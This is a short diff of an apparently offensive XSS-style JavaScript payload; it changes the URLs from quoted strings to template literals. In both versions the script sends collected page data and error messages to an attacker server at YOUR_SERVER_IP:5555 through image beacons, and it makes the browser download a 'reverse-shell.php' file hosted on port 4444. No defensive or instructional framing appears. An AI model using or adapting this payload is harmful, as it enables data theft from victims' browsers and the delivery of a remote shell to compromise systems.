@@ -121,13 +121,13 @@ sudo python3 -m http.server 4444
 
           // Send the data to your server
           let img = new Image();
-          img.src = 'http://YOUR_SERVER_IP:5555/?allData=' + encodeURIComponent(JSON.stringify(data));
+          img.src = `http://${YOUR_SERVER_IP}:5555/?allData=` + encodeURIComponent(JSON.stringify(data));
 
           // Create an anchor element dynamically
           var link = document.createElement('a');
         
           // Set the href to your hosted reverse shell
-          link.href = 'http://YOUR_SERVER_IP:4444/reverse-shell.php';
+          link.href = `http://${YOUR_SERVER_IP}:4444/reverse-shell.php`;
         
           // Set the download attribute to suggest a filename for the browser
           link.download = 'reverse-shell.php';
@@ -142,7 +142,7 @@ sudo python3 -m http.server 4444
           document.body.removeChild(link);
         } catch (error) {
           let img = new Image();
-          img.src = 'http://YOUR_SERVER_IP:5555/?error=' + encodeURIComponent(error);
+          img.src = `http://${YOUR_SERVER_IP}:5555/?error=` + encodeURIComponent(error);
         }
       })();
     </script>
